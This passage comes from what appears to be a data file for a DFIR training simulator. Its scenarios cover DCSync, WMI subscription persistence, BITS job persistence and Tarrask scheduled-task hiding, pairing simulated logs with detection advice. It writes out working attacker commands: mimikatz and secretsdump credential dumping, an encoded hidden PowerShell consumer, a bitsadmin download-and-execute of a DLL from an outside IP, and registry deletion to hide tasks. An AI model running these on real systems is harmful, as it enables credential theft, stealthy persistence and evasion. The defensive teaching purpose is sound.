      'Grounded in Microsoft Windows Security Auditing Event ID 4662 documentation, CISA AD Defense Guidance, and MITRE ATT&CK T1003.006: an attacker with Replicating Directory Changes permissions invokes the MS-DRSR (DRSUAPI) IDL_DRSGetNCChanges RPC method from a non-Domain Controller workstation to replicate the krbtgt and administrator password hashes without touching disk on the DC.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rogue Workstation (10.10.4.22)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'DC RPC Endpoint Mapper (:135)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-DC01 (lsass DRSUAPI)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Security EID 4662 & Zeek NDR', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'AD Naming Context (DC=corp)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: MS-DRSR RPC Bind to UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2 (EventID 4624 & Zeek dce_rpc)',
        narration:
          'From a compromised workstation (10.10.4.22), the attacker authenticates over SMB/RPC (Security EventID 4624 LogonType 3) to CORP-DC01 and binds to the Directory Replication Service (drsuapi) RPC interface UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2 via IDL_DRSBind.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Credential Access (T1003.006 - OS Credential Dumping: DCSync)',
        technicalCommands: [
          'lsadump::dcsync /domain:corp.local /user:corp\\krbtgt',
          'impacket-secretsdump corp.local/svc_sync@10.10.0.10 -just-dc-user krbtgt',
          'Zeek dce_rpc.log: interface=drsuapi (e3514235-4b06-11d1-ab04-00c04fc2dcd2) op=IDL_DRSBind',
        ],
        defenseMitigation:
          'Audit Active Directory ACLs on the domain root object to ensure only legitimate Domain Controller computer accounts hold DS-Replication-Get-Changes-All.',
        logs: [
          {
            id: 'dfir-dcsync-1',
            timestamp: '15:20:11.045',
            source: 'Network',
            severity: 'high',
            EventCode: 4624,
            ProcessName: 'lsass.exe',
            CommandLine: 'DCE-RPC Bind UUID e3514235-4b06-11d1-ab04-00c04fc2dcd2 (drsuapi) from 10.10.4.22',
            raw: 'zeek_dce_rpc: ts=1762183211.045 uid=C8kL91 id.orig_h=10.10.4.22 id.resp_h=10.10.0.10 id.resp_p=49666 named_pipe="5026" endpoint="drsuapi" uuid="e3514235-4b06-11d1-ab04-00c04fc2dcd2" operation="IDL_DRSBind"',
            parsedFields: {
              Protocol: 'MS-DRSR / DRSUAPI over TCP High Port',
              RpcInterfaceUuid: 'e3514235-4b06-11d1-ab04-00c04fc2dcd2',
              SourceWorkstationIp: '10.10.4.22 (Non-DC IP)',
              TargetDomainController: 'CORP-DC01 (10.10.0.10)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Directory Replication Extended Rights Check (Security EventID 4662 ControlAccess 0x100)',
        narration:
          'When IDL_DRSGetNCChanges (Opnum 3) is invoked, CORP-DC01 logs Windows Security EventID 4662 (An operation was performed on an object) on ObjectType domainDNS (%{19195a5b-6da0-11d0-afd3-00c04fd930c9}) with AccessMask 0x100 (ControlAccess) and Properties containing the Extended Rights GUIDs 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.006 - EventID 4662 Extended Rights GUIDs)',
        technicalCommands: [
          'EventID 4662: AccessMask=0x100 (ControlAccess) ObjectServer=DS',
          'DS-Replication-Get-Changes: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}',
          'DS-Replication-Get-Changes-All: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}',
        ],
        defenseMitigation:
          'Create a SIEM correlation rule matching EventID 4662 where Properties contains 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 and SubjectUserName does not end with $ (or is not in the Domain Controllers allowlist).',
        logs: [
          {
            id: 'dfir-dcsync-2',
            timestamp: '15:20:11.318',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4662,
            ProcessName: 'lsass.exe',
            CommandLine: 'IDL_DRSGetNCChanges DS-Replication-Get-Changes-All {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}',
            raw: 'EventID: 4662 | SubjectUserName: svc_sync | SubjectDomainName: CORP | ObjectServer: DS | ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9} | ObjectName: %{d482018a-52e1-4c9a-9811-0192837465ab} | AccessMask: 0x100 | Properties: %{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}',
            parsedFields: {
              EventID: '4662 (Directory Service Object Access)',
              SubjectUserName: 'svc_sync (Non-DC Account)',
              AccessMask: '0x100 (ControlAccess)',
              ExtendedRightGuid: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Replication of SupplementalCredentials & krbtgt AES-256 / NTLM Hashes',
        narration:
          'CORP-DC01 returns the DRS_MSG_GETNCCHANGESREPLY structure encrypted with the RPC session key, delivering the current and historical NTLM hashes, AES-256 Kerberos keys, and SupplementalCredentials for krbtgt to the attacker workstation for Golden Ticket forgery.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.006 - krbtgt Key Material Exfiltration)',
        technicalCommands: [
          'RPC Reply: DRS_MSG_GETNCCHANGESREPLY (Attributes: unicodePwd, dBCSPwd, supplementalCredentials)',
          'Extracted Hash: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:88e4d91a03b7190441a9c12098765432:::',
          'Extracted AES256: krbtgt:aes256-cts-hmac-sha1-96:4f91a82b73c610e9...',
        ],
        defenseMitigation:
          'Upon confirmed DCSync compromise, rotate the krbtgt account password twice across all Domain Controllers and revoke compromised privileged accounts.',
        logs: [
          {
            id: 'dfir-dcsync-3',
            timestamp: '15:20:11.690',
            source: 'Network',
            severity: 'critical',
            EventCode: 3,
            ProcessName: 'lsass.exe',
            CommandLine: 'IDL_DRSGetNCChanges response -> 10.10.4.22 (krbtgt attributes replicated)',
            raw: 'zeek_dce_rpc: ts=1762183211.690 id.orig_h=10.10.4.22 id.resp_h=10.10.0.10 endpoint="drsuapi" operation="IDL_DRSGetNCChanges" rtt=0.372s status="0x00000000 (ERROR_SUCCESS)"',
            parsedFields: {
              RpcOperation: 'IDL_DRSGetNCChanges (Opnum 3)',
              ReplicatedObject: 'CN=krbtgt,CN=Users,DC=corp,DC=local',
              ReplicatedAttributes: 'unicodePwd, supplementalCredentials (AES256/NTLM)',
              IncidentResponseAction: 'Double krbtgt password reset required',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-wmi-event-subscription-persistence-sysmon',
    title: 'Microsoft Sysmon & Mandiant DFIR — WMI Permanent Event Subscription Persistence (EventID 19 / 20 / 21)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1546.003',
    description:
      'Grounded in Microsoft Sysinternals Sysmon v15 documentation (Event IDs 19, 20, 21), Mandiant WMI forensics research, and MITRE ATT&CK T1546.003: an adversary registers a permanent WMI Event Subscription in the root\\subscription namespace consisting of an __EventFilter, a CommandLineEventConsumer, and a __FilterToConsumerBinding stored inside C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA so scrcons.exe or wmiprvse.exe executes a payload as SYSTEM.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Elevated PowerShell Session', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Winmgmt / WMI Core Service', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'OBJECTS.DATA CIM Repository', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 19/20/21 & WMI Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'scrcons.exe / wmiprvse.exe', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: WMI __EventFilter WQL Trigger Registration (Sysmon EventID 19)',
        narration:
          'Using PowerShell Set-WmiInstance or mofcomp.exe, the attacker creates a permanent __EventFilter instance in the root\\subscription CIM namespace with a WQL polling query (SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"). Sysmon EventID 19 (WmiEventFilter activity detected) logs the exact Query and EventNamespace.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Persistence (T1546.003 - Windows Management Instrumentation Event Subscription)',
        technicalCommands: [
          'Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name="SCMUpdaterFilter"; EventNamespace="root\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"}',
          'Sysmon EventID 19: Operation=Created EventNamespace=root\\cimv2 Name=SCMUpdaterFilter',
        ],
        defenseMitigation:
          'Configure Sysmon to log EventID 19 (WmiEventFilter), EventID 20 (WmiEventConsumer), and EventID 21 (WmiEventConsumerToFilter) and monitor Microsoft-Windows-WMI-Activity/Operational EventID 5861.',
        logs: [
          {
            id: 'dfir-wmi-1',
            timestamp: '04:15:10.120',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 19,
            ProcessName: 'powershell.exe',
            CommandLine: 'Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Name SCMUpdaterFilter',
            raw: 'EventID: 19 | EventType: WmiFilterEvent | Operation: Created | User: CORP\\admin_ops | EventNamespace: root\\cimv2 | Name: SCMUpdaterFilter | Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"',
            parsedFields: {
              EventID: '19 (Sysmon WmiEventFilter)',
              Namespace: 'root\\subscription',
              FilterName: 'SCMUpdaterFilter',
              WqlQuery: 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: CommandLineEventConsumer & __FilterToConsumerBinding Persistence in OBJECTS.DATA (Sysmon EventID 20 & 21)',
        narration:
          'The attacker creates a CommandLineEventConsumer specifying the payload command line (Sysmon EventID 20) and binds it to SCMUpdaterFilter via __FilterToConsumerBinding (Sysmon EventID 21 and WMI-Activity EventID 5861). Both objects are serialized into C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence (T1546.003 - CIM Repository OBJECTS.DATA Serialization)',
        technicalCommands: [
          'Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="SCMUpdaterConsumer"; CommandLineTemplate="powershell.exe -NoP -W Hidden -Enc JABjAD0..."}',
          'Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}',
          'CIM Artifact: C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA',
        ],
        defenseMitigation:
          'Inspect Microsoft-Windows-WMI-Activity/Operational EventID 5861 for permanent consumer bindings and parse offline OBJECTS.DATA during DFIR triage using PyWMIPersistenceFinder.',
        logs: [
          {
            id: 'dfir-wmi-2',
            timestamp: '04:15:12.480',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 20,
            ProcessName: 'wmiprvse.exe',
            CommandLine: 'CommandLineEventConsumer Destination="powershell.exe -NoP -W Hidden -Enc JABjAD0..."',
            raw: 'EventID: 20 | EventType: WmiConsumerEvent | Operation: Created | Name: SCMUpdaterConsumer | Type: Command Line | Destination: powershell.exe -NoP -W Hidden -Enc JABjAD0... | Correlated EventID 21 & WMI-Activity EID 5861: Consumer="CommandLineEventConsumer.Name=\\"SCMUpdaterConsumer\\"" Filter="__EventFilter.Name=\\"SCMUpdaterFilter\\""',
            parsedFields: {
              EventID: '20 (WmiEventConsumer) / 21 (WmiConsumerToFilter) / 5861 (WMI-Activity)',
              ConsumerName: 'SCMUpdaterConsumer',
              DestinationCommand: 'powershell.exe -NoP -W Hidden -Enc JABjAD0...',
              DiskRepository: 'C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM Payload Execution Under wmiprvse.exe / scrcons.exe Parentage (Sysmon EventID 1)',
        narration:
          'When the WQL timer condition evaluates to true, the WMI Provider Host (wmiprvse.exe) or WMI Standard Event Consumer (scrcons.exe) spawns the configured CommandLineTemplate as NT AUTHORITY\\SYSTEM, creating a telltale parent-child process anomaly in Sysmon EventID 1.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1047 - Windows Management Instrumentation)',
        technicalCommands: [
          'ParentImage: C:\\Windows\\System32\\wbem\\scrcons.exe (or wmiprvse.exe)',
          'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -Enc JABjAD0...',
          'Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Remove-WmiObject',
        ],
        defenseMitigation:
          'Alert on any child process (powershell.exe, cmd.exe, mshta.exe, wscript.exe, rundll32.exe) spawned by C:\\Windows\\System32\\wbem\\scrcons.exe.',
        logs: [
          {
            id: 'dfir-wmi-3',
            timestamp: '04:16:00.015',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'scrcons.exe',
            CommandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -Enc JABjAD0...',
            raw: 'EventID: 1 | User: NT AUTHORITY\\SYSTEM | ParentImage: C:\\Windows\\System32\\wbem\\scrcons.exe | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | CommandLine: powershell.exe -NoP -W Hidden -Enc JABjAD0...',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              ParentImage: 'C:\\Windows\\System32\\wbem\\scrcons.exe',
              ChildImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              UserContext: 'NT AUTHORITY\\SYSTEM',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-bitsadmin-qmgr-persistence-bits-client',
    title: 'Microsoft & Mandiant DFIR — BITS Job Persistence & qmgr.db SetNotifyCmdLine Forensics (EventID 59 / 60 / 3)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1197',
    description:
      'Grounded in Microsoft Background Intelligent Transfer Service (BITS) documentation, Mandiant qmgr.db forensic research, and MITRE ATT&CK T1197: an adversary creates a persistent BITS transfer job using bitsadmin.exe and configures /SetNotifyCmdLine so svchost.exe (-k netsvcs -s BITS) repeatedly downloads and executes a payload while storing state in C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Staging Server (:443)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Enterprise Proxy (HTTP Range)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'svchost.exe (BITS Service)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Bits-Client Operational Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'qmgr.db ESE Queue Database', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: BITS Transfer Job Creation & Remote File Addition (Bits-Client EventID 3 & 59)',
        narration:
          'The attacker runs bitsadmin /create /download WinUpdateSync and bitsadmin /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll. The Microsoft-Windows-Bits-Client/Operational log records EventID 3 (BITS service created a new job) and EventID 59 (BITS started the transfer job with the associated URL).',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1197 - BITS Jobs)',
        technicalCommands: [
          'bitsadmin.exe /create /download WinUpdateSync',
          'bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll',
          'Bits-Client/Operational EventID 59: transferId={7B92A110-4C19-4F02-9B12-841029384756} url=https://198.51.100.88/stage.dll',
        ],
        defenseMitigation:
          'Ingest Microsoft-Windows-Bits-Client/Operational Event IDs 3, 59, 60, and 61 into the SIEM and alert on non-Microsoft domains or IP-literal URLs.',
        logs: [
          {
            id: 'dfir-bits-1',
            timestamp: '08:41:19.220',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 59,
            ProcessName: 'bitsadmin.exe',
            CommandLine: 'bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll',
            raw: 'LogName: Microsoft-Windows-Bits-Client/Operational | EventID: 59 | jobTitle: WinUpdateSync | jobId: {7B92A110-4C19-4F02-9B12-841029384756} | url: https://198.51.100.88/stage.dll | fileLocalName: C:\\Users\\Public\\stage.dll | processPath: C:\\Windows\\System32\\bitsadmin.exe',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-Bits-Client/Operational',
              EventID: '3 (Job Created) / 59 (Transfer Started)',
              JobTitle: 'WinUpdateSync',
              RemoteUrl: 'https://198.51.100.88/stage.dll',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: SetNotifyCmdLine Persistence & qmgr.db ESE Serialization',
        narration:
          'The attacker configures bitsadmin /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll" and /SetMinRetryDelay WinUpdateSync 60. BITS serializes the job GUID, URL, local path, and notification command into the Extensible Storage Engine database C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db (or qmgr0.dat/qmgr1.dat).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Persistence (T1197 - BITS SetNotifyCmdLine & qmgr.db)',
        technicalCommands: [
          'bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll"',
          'bitsadmin.exe /SetMinRetryDelay WinUpdateSync 60',
          'ESE Artifact: C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db (carved via BitsParser)',
        ],
        defenseMitigation:
          'Audit active BITS jobs via bitsadmin /list /allusers /verbose and parse C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db for historical deleted job records.',
        logs: [
          {
            id: 'dfir-bits-2',
            timestamp: '08:41:21.504',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'bitsadmin.exe',
            CommandLine: 'bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll"',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\bitsadmin.exe | CommandLine: bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll" | QueueDatabase: C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              NotifyProgram: 'C:\\Windows\\System32\\regsvr32.exe',
              NotifyParameters: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
              ForensicDatabase: 'C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: BITS Transfer Completion (EventID 60) & svchost.exe Child Execution',
        narration:
          'When bitsadmin /resume WinUpdateSync completes the HTTP download (User-Agent: Microsoft BITS/7.8), Bits-Client logs EventID 60 (BITS stopped transferring the job) and the service host process (svchost.exe -k netsvcs -s BITS) directly spawns regsvr32.exe /s C:\\Users\\Public\\stage.dll.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1197 - svchost.exe -k netsvcs Child Process)',
        technicalCommands: [
          'bitsadmin.exe /resume WinUpdateSync',
          'Bits-Client EventID 60: bytesTotal=184320 bytesTransferred=184320',
          'Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\svchost.exe (-k netsvcs -s BITS) -> Image=C:\\Windows\\System32\\regsvr32.exe',
        ],
        defenseMitigation:
          'Alert on any child process (regsvr32.exe, cmd.exe, powershell.exe, rundll32.exe) spawned by svchost.exe hosting the BITS service.',
        logs: [
          {
            id: 'dfir-bits-3',
            timestamp: '08:41:24.890',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'regsvr32.exe',
            CommandLine: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\svchost.exe | ParentCommandLine: C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS | Image: C:\\Windows\\System32\\regsvr32.exe | CommandLine: regsvr32.exe /s C:\\Users\\Public\\stage.dll | Correlated Bits-Client EventID 60',
            parsedFields: {
              EventID: '1 (Sysmon) / 60 (Bits-Client Transfer Complete)',
              ParentServiceHost: 'svchost.exe -k netsvcs -p -s BITS',
              SpawnedChild: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
              HttpUserAgent: 'Microsoft BITS/7.8',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-schtasks-xml-registry-taskcache-forensics',
    title: 'Microsoft MSTIC & SANS DFIR — Scheduled Task Creation & TaskCache SD Descriptor Deletion (EventID 4698 / Sysmon EID 12)',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1053.005',
    description:
      'Grounded in Microsoft Security Auditing Event ID 4698/4702 documentation, Microsoft Threat Intelligence (MSTIC) "Tarrask" research, and SANS DFIR guides: an adversary registers a SYSTEM Scheduled Task (generating Security EventID 4698, TaskScheduler EventID 106, and an XML file in C:\\Windows\\System32\\Tasks\\) and then deletes the SD (Security Descriptor) registry value under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ to hide the task from schtasks /query and Task Scheduler GUI.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Admin Session', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'RPC ITaskSchedulerService', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'svchost.exe (Schedule Service)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Security EID 4698 & Sysmon EID 12', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'TaskCache\\Tree SD Registry Key', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Scheduled Task Registration & XML Artifact Creation (Security EventID 4698 & TaskScheduler 106)',
        narration:
          'The attacker executes schtasks.exe /create /tn "\\Microsoft\\Windows\\NetTrace\\TelemetrySync" /tr "C:\\ProgramData\\sync.exe" /sc MINUTE /mo 15 /ru SYSTEM. Windows Security EventID 4698 captures the full embedded TaskContent XML, while svchost.exe writes the XML definition to C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\TelemetrySync.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Persistence (T1053.005 - Scheduled Task/Job: Scheduled Task)',
        technicalCommands: [
          'schtasks.exe /create /tn "\\Microsoft\\Windows\\NetTrace\\TelemetrySync" /tr "C:\\ProgramData\\sync.exe" /sc MINUTE /mo 15 /ru SYSTEM',
          'Security EventID 4698: A scheduled task was created (embeds full <Task> XML)',
          'Disk Artifact: C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\TelemetrySync',
        ],
        defenseMitigation:
          'Enable Audit Other Object Access Events (Success/Failure) so Windows Security EventID 4698 (Task Created) and EventID 4702 (Task Updated) log the complete XML payload.',
        logs: [
          {
            id: 'dfir-schtasks-1',
            timestamp: '19:04:12.118',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 4698,
            ProcessName: 'schtasks.exe',
            CommandLine: 'schtasks.exe /create /tn "\\Microsoft\\Windows\\NetTrace\\TelemetrySync" /tr "C:\\ProgramData\\sync.exe" /sc MINUTE /mo 15 /ru SYSTEM',
            raw: 'EventID: 4698 | TaskName: \\Microsoft\\Windows\\NetTrace\\TelemetrySync | TaskContent: <Task><Principals><Principal><UserId>S-1-5-18</UserId></Principal></Principals><Actions><Exec><Command>C:\\ProgramData\\sync.exe</Command></Exec></Actions></Task>',
            parsedFields: {
              EventID: '4698 (Security) / 106 (TaskScheduler/Operational)',
              TaskName: '\\Microsoft\\Windows\\NetTrace\\TelemetrySync',
              PrincipalSid: 'S-1-5-18 (NT AUTHORITY\\SYSTEM)',
              ExecCommand: 'C:\\ProgramData\\sync.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Tarrask Evasion — Deleting TaskCache\\Tree SD Value as SYSTEM (Sysmon EventID 12)',
        narration:
          'Following the technique documented by Microsoft MSTIC (Hafnium / Tarrask), the attacker elevates to NT AUTHORITY\\SYSTEM (to satisfy TrustedInstaller/SYSTEM ACLs on the Schedule key) and deletes the "SD" (Security Descriptor) binary value under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\NetTrace\\TelemetrySync and removes the XML file on disk, rendering the task invisible to schtasks /query while keeping it active in TaskCache\\Tasks\\{GUID}.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1564 - Hide Artifacts: Scheduled Task SD Deletion)',
        technicalCommands: [
          'reg.exe delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\NetTrace\\TelemetrySync" /v SD /f',
          'del /f /q "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\NetTrace\\TelemetrySync"',
          'Sysmon EventID 12: EventType=DeleteValue TargetObject=...\\Schedule\\TaskCache\\Tree\\...\\SD',
        ],
        defenseMitigation:
          'Alert on Sysmon EventID 12 (RegistryObjectAddedOrDeleted) or Security EventID 4657 where TargetObject ends with \\Schedule\\TaskCache\\Tree\\*\\SD and EventType is DeleteValue.',
        logs: [
          {
            id: 'dfir-schtasks-2',
            timestamp: '19:04:16.705',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 12,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\NetTrace\\TelemetrySync" /v SD /f',
            raw: 'EventID: 12 | EventType: DeleteValue | ProcessId: 5120 | Image: C:\\Windows\\System32\\reg.exe | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\NetTrace\\TelemetrySync\\SD',
            parsedFields: {
              EventID: '12 (Sysmon RegistryEvent DeleteValue)',
              TargetObject: 'HKLM\\...\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\NetTrace\\TelemetrySync\\SD',
              EvasionEffect: 'Hides task from schtasks.exe /query and Taskschd.msc GUI',
              ResidualArtifact: 'HKLM\\...\\Schedule\\TaskCache\\Tasks\\{GUID}\\Actions',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Forensic Recovery from TaskCache\\Tasks\\{GUID}\\Actions & TaskScheduler EventID 200',
        narration:
          'Even after the SD value and XML file are deleted, the Task Scheduler service continues executing the task every 15 minutes (logging TaskScheduler EventID 200 Action Started) because the binary Actions blob (starting with 0x0300 magic version header) and DynamicInfo timestamps remain intact under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1053.005 - TaskCache\\Tasks\\{GUID} Actions Blob Recovery)',
        technicalCommands: [
          'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\*" | Select-Object URI, Actions, DynamicInfo',
          'TaskScheduler/Operational EventID 200: Task "\\Microsoft\\Windows\\NetTrace\\TelemetrySync" launched action "C:\\ProgramData\\sync.exe"',
        ],
        defenseMitigation:
          'Cross-reference all entries under TaskCache\\Tree against the presence of an SD value and parse the binary Actions value in TaskCache\\Tasks\\{GUID} during incident response.',
        logs: [
          {
            id: 'dfir-schtasks-3',
            timestamp: '19:15:00.008',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'svchost.exe',
            CommandLine: 'C:\\ProgramData\\sync.exe (Launched via hidden TaskCache GUID)',
            raw: 'LogName: Microsoft-Windows-TaskScheduler/Operational | EventID: 200 | TaskName: \\Microsoft\\Windows\\NetTrace\\TelemetrySync | ActionName: C:\\ProgramData\\sync.exe | TaskInstanceId: {91F0C421-3812-4A99-8231-001122334455}',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-TaskScheduler/Operational',
              EventID: '200 (Action Executed)',
              TaskRegistryKey: 'HKLM\\...\\Schedule\\TaskCache\\Tasks\\{91F0C421-3812-4A99-8231-001122334455}',
              BinaryActionsBlob: '03 00 ... C:\\ProgramData\\sync.exe (UTF-16LE)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-rdp-lateral-movement-tsclient-bitmap-cache',
    title: 'SANS DFIR & Microsoft Event Log — RDP Lateral Movement, Session Reconnection & BMC Bitmap Cache Forensics',
    category: 'LOG_ANALYSIS',
    mitreId: 'T1021.001',
    description:
